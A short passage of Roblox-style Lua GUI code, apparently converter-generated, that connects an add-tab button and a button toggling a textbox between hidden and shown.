		page.Tabs.ZAdd.Activated:Connect(function()
			addTab()
		end)
		page.Buttons.Hide.Activated:Connect(function()
			if states.Hidden then
				states.Hidden = false
				page.Buttons.Hide.Text = "Hide"
				textbox:Unhide()
			else
				states.Hidden = true
				page.Buttons.Hide.Text = "Unhide"
				textbox:Hide()
			end
		end)
	end)
end;
task.spawn(C_37);

return G2L["1"], require;
